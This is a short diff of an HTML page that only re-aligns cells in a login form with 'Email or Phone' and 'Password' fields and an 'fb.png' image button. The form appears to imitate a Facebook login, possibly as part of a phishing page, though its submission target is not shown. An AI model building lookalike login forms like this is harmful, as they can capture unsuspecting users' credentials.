@@ -34,15 +34,15 @@ div.transbox {
       <table  border="1">
       <tr valign="bottom">
       <td><font style="font-family:arial; font-size:10px;"><b>Email or Phone </b></font></td>
-      <td><input type="text" name="user" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
+      <td align="center"><input type="text" name="user" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
       <tr valign="bottom">
       <td><font style="font-family:arial; font-size:10px;"><b>Password </b></font></td>
-      <td><input type="password" name="password" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
+      <td align="center"><input type="password" name="password" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
       <tr valign="bottom">
       <td></td>
-      <td align="left"><input type="image" src="fb.png" style="width:200px;height:75px;"></td>
+      <td align="center"><input type="image" src="fb.png" style="width:200px;height:75px;"></td>
       </tr>
       </table>
   </form>
